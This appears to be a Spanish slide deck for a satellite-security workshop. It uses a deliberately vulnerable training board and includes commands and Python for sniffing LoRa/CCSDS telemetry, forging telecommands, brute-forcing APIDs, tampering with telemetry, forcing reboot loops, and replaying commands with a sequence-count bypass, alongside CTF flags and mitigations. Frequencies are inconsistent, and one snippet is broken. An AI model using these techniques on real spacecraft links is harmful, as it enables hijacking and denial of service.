+Por eso captura LoRa+CCSDS de forma nativa, sin SDR ni decodificación analógica.
+Es portable y parte del ecosistema Electronic Cats.
+Expone endpoints USB para configurar parámetros y para RX/TX.
+77
+
+BLOQUE 6 · CAPTURA
+Configurar el CatSniffer (downlink)
+Parámetro
+Valor
+Frecuencia
+915 MHz (downlink)
+Bandwidth
+125 kHz
+Spreading Factor
+7
+Coding Rate
+4/5
+Header
+Explícito
+CRC
+Desactivado
+SyncWord
+Privado 0x12
+Preambulo
+12
+Deben coincidir EXACTAMENTE con el downlink del satélite, o no captura nada.
+78
+
+BLOQUE 6 · CAPTURA
+Capturar el downlink
+Concepto
+Apertura del puerto de datos del CatSniffer para capturar el flujo continuo de tramas de telemetría emitidas por el satélite en 915.0 MHz
+Verás bajar los paquetes que el satélite transmite en 915MHz.
+Cada paquete baja como:  RX: <hex> | RSSI: -45 | SNR: 8
+Captura 2-3 minutos y haz inventario de qué APIDs aparecen:
+0x010 (BME280), 0x001 (heartbeat), 0x01F (todos los sensores), 0x7FF (IDLE → "pwnsat2")
+79
+
+BLOQUE 8 · PRÁCTICA
+Ataque 1: Sniffing
+ Descripción: Interceptación pasiva del flujo descendente (Downlink) emitido por el satélite al espacio.
+Superficie Explotada: Enlace RF de radio en claro sin cifrado de capa de enlace (sin CCSDS SDLS).
+Proceso del Estudiante:
+Sintonizar el CatSniffer exactamente en 916.0MHz, SF7, BW 125 kHz, SyncWord 0x12.
+Leer las líneas recibidas con prefijo RX:.
+Extraer los primeros 6 bytes correspondientes a la cabecera CCSDS.
+Decodificar el APID (bits 5 a 15) para clasificar la información (ej. 0x010 = BME280).
+Desempaquetar los enteros binarios del payload en formato Little-Endian usando la librería struct de Python.
+
+80
+
+BLOQUE 8 · PRÁCTICA
+Ataque 1: Sniffing
+Definición: El Sniffing consiste en la escucha pasiva del medio electromagnético sin alterar ni transmitir un solo fotón al aire.
+
+Impacto: Pérdida total de confidencialidad de la misión (revela ubicación, temperatura, estado de batería y payload).
+
+81
+
+BLOQUE 6 · CAPTURA
+Ejecutar el ataque
+Concepto
+Uso del script del toolkit para capturar durante 45 segundos y estructurar los paquetes interceptados en un archivo JSON local.
+# --- EN LINUX ---
+python3 toolkit/replay_capture.py capture /dev/ttyUSB0 capture.json 45
+
+# --- EN MACOS ---
+python3 toolkit/replay_capture.py capture /dev/cu.usbserial-0001 capture.json 45
+
+# --- EN WINDOWS ---
+python toolkit\replay_capture.py capture COM3 capture.json 45
+
+
+
+82
+
+BLOQUE 6 · CAPTURA
+Explicación del Script
+Flujo de Ejecución del Script:
+Configura la velocidad del puerto serie a 115200 baud.
+Limpia los búferes de entrada (flushInput()) para eliminar basura residual.
+Ejecuta un bucle while controlado por tiempo transcurrido.
+Filtra líneas que coincidan con la firma RX: <hex>.
+Pasa la trama binaria al módulo de decodificación CCSDS.
+Almacena marcas de tiempo, APID, Sequence Count y datos crudos en JSON.
+
+
+83
+
+BLOQUE 6 · CAPTURA
+Como funciona conexion serie y bucle de lectura
+Descripción: Interceptación pasiva del flujo descendente (Downlink) emitido por el satélite al espacio.
+Superficie Explotada: Enlace RF de radio en claro sin cifrado de capa de enlace (sin CCSDS SDLS).
+Proceso del Estudiante:
+Sintonizar el CatSniffer exactamente en 
+916.0 MHz
+916.0MHz, SF7, BW 125 kHz, SyncWord 0x12.
+Leer las líneas recibidas con prefijo RX:.
+Extraer los primeros 6 bytes correspondientes a la cabecera CCSDS.
+Decodificar el APID (bits 5 a 15) para clasificar la información (ej. 0x010 = BME280).
+Desempaquetar los enteros binarios del payload en formato Little-Endian usando la librería struct de Python.
+
+
+
+84
+
+BLOQUE 6 · CAPTURA
+Como funciona conexion serie y bucle de lectura
+import serial, time, json
+
+def capture_packets(port, output_file, duration):
+    ser = serial.Serial(port, 115200, timeout=1)
+    ser.reset_input_buffer()
+    frames = []
+    end_time = time.time() + duration
+    
+    while time.time() < end_time:
+        line = ser.readline().decode('utf-8', errors='ignore').strip()
+        if "RX:" in line:
+            raw_hex = line.split("RX:")[1].split("|")[0].strip()
+            frames.append({"time": time.time(), "hex": raw_hex})
+            
+    with open(output_file, 'w') as f:
+        json.dump({"frames": frames}, f, indent=2)
+
+
+85
+
+BLOQUE 6 · CAPTURA
+Como funciona: Decodificación CCSDS y Validacion CRC
+1. Decodificación de la Cabecera Primaria (6 Bytes Big-Endian)
+Packet Identification (Bytes 0-1): Versión (bits 13-15 = 000), Tipo (bit 12: 0=TM, 1=TC), SecHdr Flag (bit 11: 1), APID (bits 0-10 → identifica el sensor o proceso).
+Packet Sequence Control (Bytes 2-3): Flags (bits 14-15 = 11 paquete sin fragmentar), Sequence Count (bits 0-13 = contador incremental 0−16383).
+Packet Length (Bytes 4-5): Longitud total del payload en bytes −1 (Optimización espacial).
+2. Comprobación de Integridad Física (CRC-16 CCITT)
+Polinomio generador 0x1021 (Init 0xFFFF).
+Se calcula sobre toda la trama excluyendo los 2 bytes finales. Si el cálculo coincide con el checksum recibido, la trama se declara libre de errores de transmisión electromagnética.
+
+
+86
+
+BLOQUE 6 · CAPTURA
+Como funciona: Decodificación CCSDS y Validacion CRC
+import struct
+
+def parse_ccsds_header(raw_bytes):
+    # Desempaquetar los primeros 6 bytes del Primary Header
+    hdr = struct.unpack('>HHH', raw_bytes[:6])
+    version = (hdr[0] >> 13) & 0x07
+    pkt_type = (hdr[0] >> 12) & 0x01
+    sec_hdr = (hdr[0] >> 11) & 0x01
+    apid = hdr[0] & 0x07FF
+    seq_count = hdr[1] & 0x3FFF
+    length = hdr[2] + 1
+    return apid, seq_count, length
+
+87
+
+BLOQUE 6 · CAPTURA
+Qué hace exactamente?
+{
+  "capture_date": "2026-08-13T10:00:00Z",
+  "frames": [
+    {
+      "apid": 16,
+      "apid_hex": "0x010",
+      "type": "TM",
+      "seq": 42,
+      "hex": "0810c02a00072415600001a400",
+      "parsed_payload": {
+        "temperature_c": 24.15,
+        "pressure_hpa": 1013.2,
+        "humidity_pct": 45
+      }
+    }
+  ]
+}
+
+88
+
+BLOQUE 6 · CAPTURA
+Qué hace exactamente?
+Dada la siguiente trama hexadecimal interceptada por el CatSniffer: 0x0810c0050007...
+Convertir los primeros 2 bytes (0x0810) a Binario: 0000 1000 0001 0000
+Extraer Campos Bit a Bit:
+Bits 0-2: 000 → Versión 0 (CCSDS SPP).
+Bit 3: 0 → Tipo TELEMETRÍA (TM).
+Bit 4: 1 → Secondary Header Presente.
+Bits 5-15: 000 0001 0000 → APID 0x010 (Sensor BME280).
+Extraer Sequence Count (0xc005): Bits 2-15 = 0x0005 → Paquete #5.
+
+
+89
+
+BLOQUE 6 · CAPTURA
+Decodificar el header a mano
+Ejemplo: un paquete que empieza por 0x0801
+Dada la siguiente trama hexadecimal interceptada por el CatSniffer: 0x0810c0050007...
+Convertir los primeros 2 bytes (0x0810) a Binario: 0000 1000 0001 0000
+Extraer Campos Bit a Bit:
+Bits 0-2: 000 → Versión 0 (CCSDS SPP).
+Bit 3: 0 → Tipo TELEMETRÍA (TM).
+Bit 4: 1 → Secondary Header Presente.
+Bits 5-15: 000 0001 0000 → APID 0x010 (Sensor BME280).
+Extraer Sequence Count (0xc005): Bits 2-15 = 0x0005 → Paquete #5.
+
+90
+
+BLOQUE 6 · CAPTURA
+Reconstruir telemetría (hijacking)
+Paso 1: Toma un paquete de telemetría con APID 0x010 (BME280).
+Paso 2: Omite los 6 bytes del Primary Header + 4 bytes de timestamp MET (Total 10 bytes offset).
+Paso 3: Extrae las variables del payload binario:
+Byte 10-11: temp → int16_le / 100.0.
+Byte 12-15: presión → uint32_le / 10.0.
+Byte 16: humedad → uint8.
+Comprobación rápida:
+# En Linux / macOS:
+python3 toolkit/ccsds_tools.py parse 0810c005000700000000096f000027742d
+# En Windows:
+python toolkit\ccsds_tools.py parse 0810c005000700000000096f000027742d
+# Resultado: Temp=24.15°C | Pres=1010.0 hPa | Hum=45%
+
+91
+
+BLOQUE 6 · CAPTURA
+ToolKit del atacante (forge_command.py Multi-OS)
+El kit de herramientas del taller incluye la utilidad forge_command.py para construir e inyectar paquetes rápidamente:
+# --- RUTA A (Inyección directa por USB al Cat-Shell) ---
+python3 toolkit/forge_command.py ping --inject /dev/ttyACM2        # Linux
+python3 toolkit/forge_command.py ping --inject /dev/cu.usbmodem1103  # macOS
+python toolkit\forge_command.py ping --inject COM5                 # Windows
+
+# --- RUTA B (Inyección por RF 918 MHz con CatSniffer) ---
+python3 toolkit/forge_command.py ping --send /dev/ttyUSB0          # Linux
+python3 toolkit/forge_command.py ping --send /dev/cu.usbserial-0001 # macOS
+python toolkit\forge_command.py ping --send COM3                   # Windows
+
+92
+
+07
+Bloque 7
+Seguridad: amenazas y vectores
+93
+
+BLOQUE 7 · SEGURIDAD
+Objetivo del bloque
+Al finalizar, los participantes:
+Aplicarán la metodología STRIDE a un sistema embebido de clase satelital.
+Comprenderán las causas por las que los protocolos espaciales carecen de controles de seguridad.
+Reconocerán los 6 vectores de ataque principales presentes en el firmware de FlatSat.
+Mapearán cada vector de ataque con su correspondiente mitigación criptográfica y lógica.
+
+94
+
+BLOQUE 7 · SEGURIDAD
+Modelo de amenazas (STRIDE)
+Amenaza
+En FlatSat
+Spoofing
+Suplantar la estación terrena (no hay autenticación).
+Tampering
+Alterar telemetría o parámetros.
+Repudiation
+Sin registro de quién envió cada comando.
+Info disclosure
+Telemetría en claro, capturable por cualquiera.
+Denial of Service
+Reset loop, saturación del enlace.
+Elevation
+Acceso físico → control total.
+95
+
+BLOQUE 7 · SEGURIDAD
+¿Por qué son vulnerables?
+Mito: "Nadie puede apuntar una antena al espacio ni entender los protocolos".
+Realidad:
+Los estándares (CCSDS, AX.25) son públicos y abiertos.
+La democratización del hardware (SDRs de $20 USD, transceptores LoRa/SX1262) permite a cualquiera transmitir en bandas Sub-GHz.
+Los satélites pequeños (CubeSats) a menudo usan componentes comerciales (COTS) sin refuerzo de ciberseguridad.
+El costo computacional del cifrado solía ser prohibitivo para microcontroladores antiguos (ya no es excusa con RP2040/Cortex-M)
+
+96
+
+BLOQUE 7 · VECTOR
+Vector: enlace sin autenticación
+¿Qué es?
+El satélite acepta cualquier telecomando bien formado, sin verificar quién lo envía.
+¿Qué hace?
+Permite que un tercero controle el satélite como si fuera la estación terrena legítima.
+¿Cómo funciona?
+No hay firma ni clave: basta replicar el formato del paquete CCSDS.
+Ejemplo práctico
+Inyectar un PING (opcode 0x10) o un cambio de modo y ver al satélite obedecer.
+97
+
+BLOQUE 7 · VECTOR
+Vector: replay
+¿Qué es?
+Reenviar un telecomando legítimo capturado previamente.
+¿Qué hace?
+Repite una acción sin necesidad de entender el comando.
+¿Cómo funciona?
+El sequence count existe pero no se valida como anti-replay.
+Ejemplo práctico
+Capturar un TC válido y retransmitirlo tal cual para repetir su efecto.
+98
+
+BLOQUE 7 · VECTOR
+Vector: APID brute-forcing
+¿Qué es?
+Probar APIDs sistemáticamente para descubrir comandos válidos.
+¿Qué hace?
+Revela la superficie completa de telecomandos del satélite.
+¿Cómo funciona?
+El satélite responde «Error Unknown APID» a los inválidos → oráculo perfecto.
+Ejemplo práctico
+Iterar APIDs 0x020..0x031 y opcodes 0x00..0xFF; el log «Unknown TC APID/opcode» marca los inválidos.
+99
+
+BLOQUE 7 · VECTOR
+Vector: command injection
+¿Qué es?
+Inyectar telecomandos propios, por USB o por RF.
+¿Qué hace?
+Da control directo de las funciones del satélite.
+¿Cómo funciona?
+Basta construir un paquete CCSDS válido y entregarlo por el canal correcto.
+Ejemplo práctico
+Enviar OVERRIDE_SENSOR (0x40) o EXEC (0xEE) y observar el efecto en la telemetría.
+100
+
+BLOQUE 7 · VECTOR
+Vector: telemetry tampering
+¿Qué es?
+Alterar valores que el satélite reporta o sus parámetros internos.
+¿Qué hace?
+Hace que el satélite mienta sobre su estado, o actúe con valores peligrosos.
+¿Cómo funciona?
+OVERRIDE_SENSOR (opcode 0x40) no valida rango → se puede fijar cualquier temperatura.
+Ejemplo práctico
+Forzar temp ≈ 100 °C y ver el valor falso propagarse en la telemetría (flag SPOOFED_TEMP_9999).
+101
+
+BLOQUE 7 · VECTOR
+Vector: logic bombing
+¿Qué es?
+Disparar una función destructiva ya presente en el firmware.
+¿Qué hace?
+Provoca denegación de servicio del satélite.
+¿Cómo funciona?
+TC_OP_EXEC (0xEE) inyecta texto al shell → un "reboot" reinicia el MCU.
+Ejemplo práctico
+Enviar EXEC "reboot" repetidamente para forzar un reset loop y dejarlo inoperante.
+102
+
+08
+Bloque 8
+Ataque y defensa en la práctica
+103
+
+BLOQUE 8 · PRÁCTICA
+Objetivo del bloque
+Al finalizar, los participantes:
+Construirán paquetes CCSDS válidos calculando automáticamente el CRC-16 en Python.
+Ejecutarán inyección de telecomandos a través de las dos rutas operativas (Ruta A USB y Ruta B RF).
+Explotarán los ataques de Spoofing, Telemetry Tampering, Logic Bombing y Replay Attack.
+Discutirán y propondrán las mitigaciones defensivas correspondientes para cada vector.
+
+104
+
+BLOQUE 8 · PRÁCTICA
+Construcción de paquete con ccsds_tools.py
+Concepto
+Uso del módulo de Python para ensamblar los 6 bytes del Primary Header, adjuntar el tiempo MET, incorporar el payload del comando y calcular el CRC-16 CCITT
+
+from toolkit.ccsds_tools import build_tc_frame, APIDS, OPCODES
+# (O si estás dentro de la carpeta toolkit: from ccsds_tools import build_tc_frame, APIDS, OPCODES)
+
+# Construir trama de telecomando PING (APID 0x020, Opcode 0x10)
+frame_bytes = build_tc_frame(APIDS["TC_COMMAND"], bytes([OPCODES["PING"]]))
+print(f"[+] Trama CCSDS Generada ({len(frame_bytes)} bytes): {frame_bytes.hex()}")
+
+
+105
+
+BLOQUE 8 · PRÁCTICA
+Dos rutas, un mismo paquete
+Característica / Parámetro
+Ruta A - Inyección por USB
+Ruta B - Inyección por RF
+Medio de transporte
+Cable USB-C directo a la consola del satélite.
+Transmisión por el aire mediante el CatSniffer.
+Commando utilizado
+inject_tc <hex_string> en Endpoint 3.
+TX <hex_string> en modo mando del CatSniffer.
+Frecuencia de Radio
+N/A (Loopback lógico interno sin emitir RF).
+918.0 MHz (Radio 0 en recepción)
+Confiabilidad
+100% reproducible (Ideal para iniciar).
+Realista (Afectado por ambiente y sintonía).
+Uso Recomendado
+Grupos con setup basico o validación rápida.
+Grupos avanzados que buscan efecto por el aire.
+106
+
+BLOQUE 8 · PRÁCTICA
+Ruta A — Inyección por USB
+Concepto
+Envío directo de la trama hexadecimal mediante la consola interactiva del propio satélite, simulando la recepción en loopback interno sin transmitir radiofrecuencia
+
+# --- EN LINUX ---
+python3 toolkit/forge_command.py ping --inject /dev/ttyACM2
+
+# --- EN MACOS ---
+python3 toolkit/forge_command.py ping --inject /dev/cu.usbmodem1103
+
+# --- EN WINDOWS ---
+python toolkit\forge_command.py ping --inject COM5
+
+
+107
+
+BLOQUE 8 · PRÁCTICA
+Ruta B — Inyección por RF (916 MHz)
+Concepto
+Transmisión electromagnética del telecomando por la antena del CatSniffer en 918.0MHz para ser recibido por la Radio 0 del satélite.
+
+# --- EN LINUX ---
+python3 toolkit/forge_command.py ping --send /dev/ttyUSB0
+
+# --- EN MACOS ---
+python3 toolkit/forge_command.py ping --send /dev/cu.usbserial-0001
+
+# --- EN WINDOWS ---
+python toolkit\forge_command.py ping --send COM3
+
+108
+
+BLOQUE 8 · PRÁCTICA
+Ataque 2: Spoofing
+Descripción: Forjar tramas binarias de control válidas y transmitirlas por el aire para obligar al satélite a ejecutar acciones no autorizadas.
+Requisito Técnico:
+El microcontrolador RP2040 verifica la integridad física de cada paquete. Si el checksum CRC-16 CCITT es inválido, la radio SX1262 descarta silenciosamente la trama.
+Polinomio CRC-16 CCITT: 0x1021, Valor Inicial: 0xFFFF.
+Implementación:
+Definir el APID de telecomando (0x020 = TC_COMMAND).
+Seleccionar el opcode del objetivo (ej. 0x10 para PING, 0x01 para SAFE, 0x40 para Tampering).
+Calcular el CRC-16 sobre los 10 bytes iniciales e instalar el resultado de 2 bytes al final.
+Emitir la cadena hexadecimal por la Ruta A o Ruta B.
+
+
+109
+
+BLOQUE 8 · PRÁCTICA
+Ataque 2: Spoofing
+Definición: El Spoofing consiste en la suplantación de identidad de la Estación Terrena legítima enviando órdenes falsificadas que el satélite obedece ciegamente. 
+[ ATACANTE CON CATSNIFFER ]  ===( Frecuencia 918 MHz )===>  [ SATÉLITE FLATSAT ]
+ (Sin Claves / Sin Firma)                                    (Ejecuta la orden recibida)
+Por qué ocurre: El estándar CCSDS original no exige firmas criptográficas en la cabecera primaria. El satélite asume que cualquier paquete que llegue con el CRC válido proviene del centro de control oficial.
+
+
+
+110
+
+BLOQUE 8 · PRÁCTICA
+Por qué este Script?
+El Reto: Construir manualmente la trama binaria en texto hexadecimal para cada comando, calculando desplazamientos de bits y CRC-16 a mano, resulta inviable y propenso a errores durante una operación.
+La Solución: forge_command.py parametriza la construcción al instante:
+Mapea nombres comprensibles (ping, safe, nominal, tampering) a sus APIDs y opcodes.
+Calcula el Packet Length exacto.
+Genera el checksum CRC-16 CCITT al vuelo.
+Envía el comando directamente al puerto serie seleccionado.
+
+
+
+111
+
+BLOQUE 8 · PRÁCTICA
+Cómo funciona: Mapeo de Cifrados y Cifrados AES?
+Diccionario de Mapeo Interno:
+APIDS = {"TC_COMMAND": 0x020, "SET_FREQ": 0x021, "EXEC": 0x0EE}
+OPCODES = {"PING": 0x10, "SAFE": 0x01, "NOMINAL": 0x02, "OVERRIDE": 0x40}
+Soporte de Cifrado Opcional (Nivel 3):
+Para telecomandos que requieren protección en niveles difíciles del CTF, el script invoca pycryptodome para cifrar el payload mediante AES-128-ECB o AES-GCM usando una clave simétrica compartida.
+
+112
+
+BLOQUE 8 · PRÁCTICA
+Cómo funciona?
+import crcmod
+
+# Definir función matemática de CRC-16 CCITT (Polinomio 0x1021, Init 0xFFFF)
+crc16_func = crcmod.mkCrcFun(0x11021, rev=False, initCrc=0xFFFF, xorOut=0x0000)
+
+def append_crc(payload_bytes):
+    crc_val = crc16_func(payload_bytes)
+    # Convertir a 2 bytes Big-Endian e integrar al final
+    return payload_bytes + struct.pack('>H', crc_val)
+Transmisión de Datos:
+Por Aire: Envía la cadena TX <trama_hex>\r\n a la radio transmisora.
+Por USB: Envía inject_tc <trama_hex>\r\n a la consola del satélite.
+
+
+
+113
+
+BLOQUE 8 · PRÁCTICA
+Qué hace exactamente?
+Ensambla la cabecera CCSDS con APID 0x020.
+Integra el opcode seleccionado en el primer byte del payload.
+Suma el checksum de integridad CRC-16 CCITT.
+Transmite la trama binaria resultante por el canal seleccionado.
+Resultado: El satélite obedece la instrucción y cambia su estado operativo en tiempo real.
+
+114
+
+BLOQUE 8 · PRÁCTICA
+Guia
+
+Paso a Paso para Cambiar el Satélite a Modo Seguro (SAFE)
+Asegúrate de tener la antena conectada a la radio transmisora.
+Abre la terminal en tu computadora.
+Ejecuta el comando de falsificación apuntando al puerto de tu radio:
+# --- EN LINUX ---
+python3 toolkit/forge_command.py safe --send /dev/ttyUSB0
+
+# --- EN MACOS ---
+python3 toolkit/forge_command.py safe --send /dev/cu.usbserial-0001
+
+# --- EN WINDOWS ---
+python toolkit\forge_command.py safe --send COM3
+Verificación:
+Revisa la consola del satélite: Aparece [TC DISPATCH] APID=0x020 Opcode=0x01 -> Changing mode to SAFE.
+Observa el LED NeoPixel de la placa: Cambia su color a Azul / Verde.
+Revisa la telemetría en el CatSniffer: El campo flight_mode cambia de 1 (Nominal) a 0 (Safe).
+
+
+
+115
+
+BLOQUE 8 · PRÁCTICA
+Checkpoint: el PING manda
+[!TIP] REGLA DE ORO DE AUDITORÍA: Antes de lanzar ataques complejos, valida siempre la conectividad del canal enviando un comando PING (APID 0x020, Opcode 0x10).
+Secuencia de Confirmación de PING:
+En la consola del satélite: TC dispatch: APID=0x020 Opcode=0x10 -> TC PING - sending PONG!.
+En el CatSniffer (
+916.0 MHz
+916.0MHz Downlink): Recibes un paquete TM Heartbeat con el payload "PONG".
+Interpretación:
+Si el PING responde 
+→
+→ El formato CCSDS y la frecuencia de RF son correctos. ¡Puedes proceder con los ejercicios de ataque!
+Si el PING no responde 
+→
+→ Revisa la frecuencia, el Sync Word o el puerto asignado.
+
+Si no responde → Ruta A: revisa el puerto Cat-Shell. Ruta B: revisa SF/BW/syncword y que estás en 916.
+116
+
+BLOQUE 8 · PRÁCTICA
+Ejercicio: APID brute-force
+Concepto
+Exploración sistemática de los APIDs del satélite para mapear comandos no documentados aprovechando el oráculo de error del firmware.
+Código
+# --- EN LINUX ---
+python3 toolkit/frame_fuzzer.py online /dev/ttyUSB0
+
+# --- EN MACOS ---
+python3 toolkit/frame_fuzzer.py online /dev/cu.usbserial-0001
+
+# --- EN WINDOWS ---
+python toolkit\frame_fuzzer.py online COM3
+
+117
+
+BLOQUE 8 · PRÁCTICA
+Ejercicio: telemetry tampering
+Concepto
+Inyección del comando OVERRIDE_SENSOR (APID 0x020, Opcode 0x40) especificando un entero de 32 bits en Big-Endian para forzar una lectura falsa de 100.0∘C (10000 Dec = 0x00002710).
+Código
+# --- EN LINUX ---
+python3 toolkit/forge_command.py raw 1820c00000094000002710 --send /dev/ttyUSB0
+
+# --- EN MACOS ---
+python3 toolkit/forge_command.py raw 1820c00000094000002710 --send /dev/cu.usbserial-0001
+
+# --- EN WINDOWS ---
+python toolkit\forge_command.py raw 1820c00000094000002710 --send COM3
+
+118
+
+BLOQUE 8 · PRÁCTICA
+Ejercicio: logic bombing
+Concepto
+Inyección del comando EXEC (APID 0x0EE o Opcode 0xEE) cargado con la cadena de texto "reboot" para forzar la ejecución de una instrucción destructiva de sistema y reiniciar el microcontrolador.
+Código
+# --- EN LINUX (Ruta A USB) ---
+python3 toolkit/forge_command.py exec reboot --inject /dev/ttyACM2
+
+# --- EN MACOS (Ruta A USB) ---
+python3 toolkit/forge_command.py exec reboot --inject /dev/cu.usbmodem1103
+
+# --- EN WINDOWS (Ruta A USB) ---
+python toolkit\forge_command.py exec reboot --inject COM5
+
+119
+
+BLOQUE 8 · PRÁCTICA
+Ataque 3: Replay
+Definición: Consiste en interceptar transmisiones de telecomandos válidas realizadas por operadores legítimos en el pasado y retransmitirlas por radio para obligar al satélite a repetir la misma acción de forma maliciosa.
+[ PASO 1: CAPTURA PASIVA ]
+Estación Terrena Oficial ===( TC Válido )===> Satélite FlatSat
+                                                   |
+                                                   v Interceptado por Atacante (Guardado en JSON)
+
+[ PASO 2: RE-TRANSMISIÓN MALICIOSA ]
+Atacante ===( Retransmite exactamente la misma trama )===> Satélite FlatSat (¿Obedece?)
+
+
+
+120
+
+BLOQUE 8 · PRÁCTICA
+Ataque 3: Replay
+   Mecanismo Defensivo Anti-Replay:
+En niveles de dificultad medio/difícil, el firmware registra en memoria el último Sequence Count procesado (SCúltimo).
+Si el satélite recibe un paquete con SCrecibido ≤ SCúltimo, rechaza el paquete inmediatamente.
+Bypass Dinámico del Atacante:
+Tomar la trama interceptada del archivo capture.json.
+Decodificar la cabecera CCSDS de 6 bytes e isolar el campo Sequence Count (bits 2 a 15 de los bytes 2-3).
+Incrementar intencionalmente el contador a un valor muy superior (ej. 
+SCnuevo=SCoriginal+100).
+Escribir los nuevos bytes en la cabecera y recalcular obligatoriamente el CRC-16 CCITT.
+Retransmitir la trama modificada al aire.
+
+121
+
+BLOQUE 8 · PRÁCTICA
+Solución del problema anterior
+Creación de Archivo de Tramas para Replay
+Crea un archivo local llamado clear_replay.json con una trama capturada previamente:
+{
+  "capture_date": "2026-08-13T10:00:00Z",
+  "frames": [
+    {
+      "hex": "1820cc001000066a47e41f012fb6",
+      "apid": 32,
+      "seq": 1,
+      "type": "TC"
+    }
+  ]
+}
+
+122
+
+BLOQUE 8 · PRÁCTICA
+Por qué este Script?
+El Problema: Reenviar la trama exacta capturada fallará en cuanto el satélite tenga activada la protección anti-replay por contador de secuencia.
+La Solución: replay_capture.py incorpora el modo replay que modifica dinámicamente los contadores sobre la marcha:
+Carga las tramas históricas del JSON.
+Extrae y aumenta el Sequence Count.
+Recalcula el checksum CRC-16.
+Transmite las réplicas por la radio introduciendo un retardo dinámico para no saturar el canal.
+ 
+123
+
+BLOQUE 8 · PRÁCTICA
+Como funciona?
+def load_and_modify_replay(json_file, seq_increment=100):
+	with open(json_file, ‘r’) as f:
+modified_frames = []
+	for frame in data[“frames”]:
+raw_bytes = bytearray.fromhex(frame[“hex”])
+# Modificar Sequence Count en bytes 2 y 3
+        orig_seq = struct.unpack('>H', raw_bytes[2:4])[0] & 0x3FFF
+        new_seq = (orig_seq + seq_increment) & 0x3FFF
+        # Re-empaquetar Sequence Flags (11) + New Sequence Count
+        new_seq_hdr = (0x3 << 14) | new_seq
+        raw_bytes[2:4] = struct.pack('>H', new_seq_hdr)
+        # Recalcular CRC-16 sobre los bytes modificados (excluyendo los últimos 2 bytes del CRC viejo)
+        clean_payload = raw_bytes[:-2]
+        new_crc = crc16_func(clean_payload)
+        raw_bytes[-2:] = struct.pack('>H', new_crc)
+        modified_frames.append(raw_bytes.hex())
+    return modified_frames
+
+
+
+
+
+124
+
+BLOQUE 8 · PRÁCTICA
+Como funciona?
+# Transmisión de tramas modificadas con retardo programable
+for hex_frame in modified_frames:
+    command_str = f"TX {hex_frame}\r\n"
+    ser.write(command_str.encode('utf-8'))
+    print(f"[*] Re-transmitiendo trama con SC modificado: {hex_frame}")
+    time.sleep(2.0)  # Retardo dinámico de 2 segundos entre tramas
+Retardo Dinámico: Evita la colisión de fotones RF en el aire y otorga tiempo al microcontrolador para procesar la orden y emitir la respuesta en Downlink.
+
+125
+
+BLOQUE 8 · PRÁCTICA
+Qué hace exactamente?
+
+Concepto
+Ejecución del script de Replay apuntando al archivo JSON para omitir la validación anti-replay del satélite mediante la inyección del contador de secuencia incrementado.
+Código
+# --- EN LINUX ---
+python3 toolkit/replay_capture.py replay /dev/ttyUSB0 clear_replay.json --modify-seq
+
+# --- EN MACOS ---
+python3 toolkit/replay_capture.py replay /dev/cu.usbserial-0001 clear_replay.json --modify-seq
+
+# --- EN WINDOWS ---
+python toolkit\replay_capture.py replay COM3 clear_replay.json --modify-seq
+
+126
+
+BLOQUE 8 · PRÁCTICA
+Defensa: mitigaciones
+ Estación Terrena                                                   FlatSat Satellite
++-----------------------------------+                                                                    +-----------------------------------+
+|  1. Telecomando CCSDS              |                                                       |  1. Verificar HMAC-SHA256    |
+|  2. Firma HMAC-SHA256 (SDLS) |   ===> Enlace RF 918 MHz ===> |  2. Verificar
+ Sequence Count > N                      |
+|  3. Sequence Count Incremental   |                                                       |  3. Si es válido -> Ejecutar      |
++-----------------------------------+                                                                      +-----------------------------------+
+Tres Pilares de Protección Espacial (CCSDS SDLS)
+Autenticidad e Integridad (HMAC-SHA256): Incorporación de una cabecera secundaria con firma criptográfica.
+Anti-Replay Estricto: Registro en memoria no volátil del último contador de secuencia procesado.
+Cifrado del Enlace (AES-GCM-128): Protección de confidencialidad para evitar el Sniffing pasivo.
+
+
+127
+
+BLOQUE 8 · PRÁCTICA
+Ataque → mitigación
+Ataque
+Mitigación
+Command injection
+Autenticación de TC
+Replay
+Validar sequence count (anti-replay)
+Telemetry tampering
+Validación de parámetros + integridad
+Info disclosure
+Cifrado del enlace
+Logic bombing
+Autenticación + límites de tasa
+Acceso físico
+Deshabilitar/proteger debug
+128
+
+09
+Cierre
+Reto integrador y preguntas
+129
+
+CIERRE
+Reto integrador (CTF)
+Captura · Descubre · Inyecta
+Bandera 1: Captura de Downlink (100 Pts)
+Sintoniza el CatSniffer en 916.0MHz, decodifica el paquete IDLE (APID 0x7FF) y extrae la cadena oculta: flag{pwnsat2_downlink_secret}.
+Bandera 2: Descubrimiento de APID Oculto (200 Pts)
+Ejecuta fuerza bruta sobre los APIDs (0x020 a 0x031) hasta encontrar el comando de depuración no documentado y leer su respuesta.
+Bandera 3: Alteración de Telemetría (300 Pts)
+Inyecta un paquete de telemetría falso con OVERRIDE_SENSOR provocando la activación de la bandera SPOOFED_TEMP_9999.
+Bandera 4: Trigger de Logic Bomb (400 Pts)
+Envía una orden EXEC reboot que fuerce un reinicio en bucle del procesador y obtén la bandera final en la consola.
+
+Gana la estación que logra los tres pasos y explica la mitigación de cada uno.
+130
+
+CIERRE
+Evaluación rápida (5 min)
+Qué campo de la cabecera primaria CCSDS distingue un Telecomando (TC) de una Telemetría (TM)?
+Respuesta: El bit Packet Type (Bit 3 del Byte 0). 0 = TM, 1 = TC.
+¿Por qué la longitud del paquete en CCSDS es igual a 
+Bytes Payload−1
+Bytes Payload−1?
+Respuesta: Porque el valor 0 representa 1 byte de datos, optimizando el uso de bits en espacio.
+¿Cuál es la función del comando flatsat mode gs?
+Respuesta: Cambia la placa al rol de Ground Station, deteniendo la transmisión en Radio 1 para permitir una sintonía limpia.
+¿Por qué el Checksum CRC-16 NO protege contra el ataque de Replay?
+Respuesta: Porque la trama interceptada del pasado ya posee un CRC válido; al retransmitirla sin cambios, el CRC sigue siendo correcto.
+¿Qué estándar de CCSDS define las mitigaciones de seguridad (HMAC y Cifrado)?
+Respuesta: El estándar CCSDS SDLS (Space Data Link Security - Blue Book 355.0-B-1).
+
+131
+
+¡Gracias!
+Eduardo Contreras  ·  CTOAndrés Sabas  ·  CEO
+[s@electroniccats.com]   ·   electroniccats.com   ·   pwnsat.org
+132
